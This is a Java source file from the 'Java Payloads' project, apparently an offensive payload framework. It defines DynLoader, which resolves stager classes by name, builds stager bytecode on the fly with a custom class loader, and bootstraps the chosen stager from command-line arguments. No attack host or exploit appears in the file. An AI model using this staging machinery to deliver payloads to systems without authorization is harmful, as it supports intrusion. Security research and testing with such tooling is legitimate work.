/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.loader;

import javapayload.builder.dynstager.DynStagerBuilder;
import javapayload.stager.Stager;

public class DynLoader {

	public static Class loadStager(String name, String[] args, int firstArg) throws Exception {
		String className = "javapayload.stager." + name;
		try {
			return Class.forName(className);
		} catch (ClassNotFoundException ex) {
			DynStagerURLStreamHandler ush = DynStagerURLStreamHandler.getInstance();
			try {
				return ush.getDynClassLoader().loadClass(className);
			} catch (ClassNotFoundException ex2) {
			}
			int pos = name.indexOf('_');
			if (pos != -1) {
				String dsbName = name.substring(0, pos);
				String stagerName = name.substring(pos + 1);
				String extraArg = null;
				pos = dsbName.indexOf('$');
				if (pos != -1) {
					extraArg = dsbName.substring(pos + 1);
					dsbName = dsbName.substring(0, pos);
				}
				DynStagerBuilder dsb = null;
				Class baseStagerClass = null;

				try {
					dsb = (DynStagerBuilder) Class.forName("javapayload.builder.dynstager." + dsbName).newInstance();
					baseStagerClass = loadStager(stagerName, null, 0);
				} catch (ClassNotFoundException ex2) {
				}
				if (baseStagerClass != null) {
					String[] dynArgs = args;
					if (firstArg != 0 && dynArgs != null) {
						dynArgs = new String[args.length - firstArg];
						System.arraycopy(args, firstArg, dynArgs, 0, dynArgs.length);
					}
					byte[] bytecode = dsb.buildStager(name, baseStagerClass, extraArg, dynArgs);
					ush.addStager(name, bytecode);
					return ush.getDynClassLoader().loadClass(className);
				}
			}
			throw ex;
		}
	}

	public static void main(String[] args) throws Exception {
		final Stager stager = (Stager) loadStager(args[0], args, 0).newInstance();
		stager.bootstrap(args);
	}
}
